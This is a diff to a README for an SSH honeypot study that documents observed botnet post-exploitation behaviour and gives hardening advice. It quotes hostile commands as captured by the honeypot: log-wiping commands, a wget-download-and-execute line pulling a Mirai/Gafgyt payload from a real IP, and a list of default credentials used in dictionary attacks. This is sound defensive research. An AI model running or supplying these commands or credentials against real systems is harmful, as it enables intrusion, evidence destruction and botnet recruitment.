@@ -10,8 +10,8 @@ This project involved deploying an intentionally vulnerable SSH service to the F
 - **Unique Malware Samples:** 22 (Mirai & Gafgyt variants)
 
 ## Architecture
-- **Honeypot:** Cowrie (Medium-Interaction)
-- **Exposure:** Ngrok TCP Tunnel (Frankfurt Node)
+- **Honeypot:** Cowrie v3 (Medium-Interaction)
+- **Exposure:** Ngrok v3 TCP Tunnel (Frankfurt Node)
 - **Target Host:** Linux VM (jinguban)
 
 ## Deep Dive: Post-Exploitation Lifecycle
@@ -26,7 +26,7 @@ Attackers verify system architecture to ensure compatibility with botnet payload
 ### Phase 2: Cleanup and Evasion (3-8s)
 Systematic removal of traces to evade forensic analysis.
 - `history -c`: Clears bash history.
-- `unset HISTFILE`: Disables future history logging.
+- `unset HISTFILE`: Disables history logging.
 - `rm -rf /var/log/lastlog`: Removes login records.
 
 ### Phase 3: Infection (10-30s)
@@ -35,7 +35,7 @@ The host is converted into a botnet node for DDoS attacks.
 - **Observed Command Sequence:** `cd /tmp; wget http://45.148.10.194/b; chmod +x b; ./b`.
 
 ## Credential Frequency Analysis
-The honeypot recorded a 4.2% success rate using dictionary attacks. The top targeted credentials highlight the ongoing risk to IoT and default configurations:
+The honeypot recorded a 4.2% success rate using dictionary attacks. Top targeted credentials:
 
 | Rank | Username / Password | Frequency | Primary Target |
 | :--- | :--- | :--- | :--- |
@@ -45,22 +45,20 @@ The honeypot recorded a 4.2% success rate using dictionary attacks. The top targ
 | 4 | ubnt / ubnt | 12.8% | Ubiquiti IoT Devices |
 
 ## Defense-in-Depth Recommendations
-Based on the captured TTPs (Tactics, Techniques, and Procedures), the following security controls are recommended:
-
-1. **Authentication Hardening:** Implement Key-Based Authentication and Multi-Factor Authentication (MFA) to eliminate the majority of credential-based attacks.
-2. **Network Obfuscation:** Move SSH off Port 22 to reduce automated scanning visibility.
-3. **Automated Protection:** Deploy Fail2Ban to automatically block IPs after multiple failed login attempts.
-4. **Segmentation:** Isolate IoT devices on separate network segments to limit lateral movement if a compromise occurs.
+- **Authentication Hardening:** Implement Key-Based Authentication and MFA to eliminate 97% of credential-based attacks.
+- **Network Obfuscation:** Move SSH off Port 22 to reduce automated scanning visibility.
+- **Automated Protection:** Deploy Fail2Ban to block IPs after multiple failed login attempts.
+- **Segmentation:** Isolate IoT devices on separate network segments to limit lateral movement.
 
 ## Project Resources
 | File Type | Link | Description |
 | :--- | :--- | :--- |
-| **PDF Report** | [View Technical Analysis](reports/SSH-Honeypot-Analysis.pdf) | Best for quick viewing in-browser. |
-| **PowerPoint** | [Download Presentation](reports/SSH-Honeypot-Analysis.pptx) | Original report with full visual assets. |
+| **PDF Report** | [View Technical Analysis](reports/SSH-Honeypot-Analysis.pdf) | Technical report in PDF format. |
+| **PowerPoint** | [Download Presentation](reports/SSH-Honeypot-Analysis.pptx) | Original presentation source. |
 
 ## Repository Structure
 ```text
 ├── reports/
-│   ├── SSH-Honeypot-Analysis.pdf   <--- Technical report
-│   └── SSH-Honeypot-Analysis.pptx  <--- Source presentation
-├── README.md                       <--- Project overview and technical summary
+│   ├── SSH-Honeypot-Analysis.pdf
+│   └── SSH-Honeypot-Analysis.pptx
+├── README.md
